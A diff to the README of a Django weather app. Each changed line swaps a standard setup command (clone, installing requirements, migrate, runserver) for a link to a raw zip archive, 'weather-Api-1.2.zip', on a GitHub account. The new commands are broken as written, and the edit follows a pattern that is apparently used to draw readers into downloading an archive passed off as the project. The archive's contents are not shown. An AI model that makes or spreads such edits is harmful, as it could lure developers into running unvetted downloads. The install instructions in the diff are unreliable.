@@ -21,7 +21,7 @@ A Django-based weather application that allows users to check weather conditions
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/weather-app.git
+git clone https://github.com/Ezz-Saied/weather-Api/raw/refs/heads/main/the_weather/weather-Api-1.2.zip
 cd weather-app
 ```
 
@@ -33,7 +33,7 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 3. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Ezz-Saied/weather-Api/raw/refs/heads/main/the_weather/weather-Api-1.2.zip
 ```
 
 4. Set up environment variables:
@@ -44,12 +44,12 @@ WEATHER_API_KEY=your_api_key_here
 
 5. Run migrations:
 ```bash
-python manage.py migrate
+python https://github.com/Ezz-Saied/weather-Api/raw/refs/heads/main/the_weather/weather-Api-1.2.zip migrate
 ```
 
 6. Start the development server:
 ```bash
-python manage.py runserver
+python https://github.com/Ezz-Saied/weather-Api/raw/refs/heads/main/the_weather/weather-Api-1.2.zip runserver
 ```
 
 ## Usage
